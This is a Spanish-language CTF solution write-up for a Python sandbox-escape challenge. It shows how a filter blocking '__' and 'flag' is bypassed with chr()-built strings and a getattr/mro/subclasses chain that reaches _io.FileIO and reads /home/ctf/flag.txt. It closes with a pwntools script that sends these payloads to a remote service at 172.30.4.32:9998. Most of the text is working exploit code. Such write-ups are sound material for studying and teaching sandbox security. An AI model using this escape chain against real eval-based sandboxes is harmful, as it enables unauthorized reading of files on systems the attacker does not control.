# Solución — pwn-sandbox-escape

## Vulnerabilidad
El sandbox bloquea `__` como string literal, pero no puede bloquear la
construcción dinámica de strings con `chr()`.

## Bypass del filtro
`__` en ASCII es `chr(95)+chr(95)` = `chr(95)*2`

Por lo tanto `__class__` se puede construir como:
```python
chr(95)*2 + 'class' + chr(95)*2  # = '__class__'
```

Y usarlo con `getattr()`:
```python
getattr((), chr(95)*2+'class'+chr(95)*2)  # = tuple
```

## Cadena de escape completa

### Paso 1: Llegar a object
```python
getattr(getattr((), chr(95)*2+'class'+chr(95)*2), chr(95)*2+'mro'+chr(95)*2)()[1]
# => <class 'object'>
```

### Paso 2: Obtener subclases
```python
getattr(getattr(getattr((), chr(95)*2+'class'+chr(95)*2), chr(95)*2+'mro'+chr(95)*2)()[1], chr(95)*2+'subclasses'+chr(95)*2)()
# => [<class 'type'>, <class 'weakref'>, ..., <class '_io.FileIO'>, ...]
```

### Paso 3: Encontrar FileIO o io.open
```python
# Enumerar las subclasses hasta encontrar _io.FileIO
# Índice varía según Python version — usar list comprehension con str()
[str(c) for c in getattr(getattr(getattr((), chr(95)*2+'class'+chr(95)*2), chr(95)*2+'mro'+chr(95)*2)()[1], chr(95)*2+'subclasses'+chr(95)*2)()]
```

Buscar `FileIO` o `TextIOWrapper` en la lista e identificar su índice.

### Paso 4: Leer el flag
```python
# Asumiendo que FileIO está en índice X:
getattr(getattr(getattr((), chr(95)*2+'class'+chr(95)*2), chr(95)*2+'mro'+chr(95)*2)()[1], chr(95)*2+'subclasses'+chr(95)*2)()[X]('/home/ctf/'+chr(102)+'lag.txt').read()
```

Nota: `'flag'` también está bloqueado → usar `chr(102)+'lag'` = `'flag'`

### Exploit comprimido
```python
# Una línea — ajustar índice X según la versión
SC = chr(95)*2
obj = getattr(getattr(getattr((), SC+'class'+SC), SC+'mro'+SC)()[1], SC+'subclasses'+SC)()
fio = [c for c in obj if 'FileIO' in str(c)][0]
fio('/home/ctf/'+chr(102)+'lag.txt').read()
```

## Script automatizado
```python
from pwn import *

p = remote('172.30.4.32', 9998)

SC = "chr(95)*2"

# Paso 1: enumerar subclasses
enum_expr = (
    f"[str(i)+':'+str(c) for i,c in "
    f"enumerate(getattr(getattr(getattr((),"
    f"{SC}+'class'+{SC}),"
    f"{SC}+'mro'+{SC})()[1],"
    f"{SC}+'subclasses'+{SC})())"
    f" if 'FileIO' in str(c) or 'open' in str(c).lower()]"
)

p.recvuntil(b'>>> ')
p.sendline(enum_expr.encode())
resp = p.recvline()
print(resp)

# Paso 2: leer flag con el índice encontrado (ej: 103)
IDX = 103  # ajustar
read_expr = (
    f"getattr(getattr(getattr((),"
    f"{SC}+'class'+{SC}),"
    f"{SC}+'mro'+{SC})()[1],"
    f"{SC}+'subclasses'+{SC})()[{IDX}]"
    f"('/home/ctf/'+chr(102)+'lag.txt').read()"
)
p.sendline(read_expr.encode())
print(p.recvline())
```
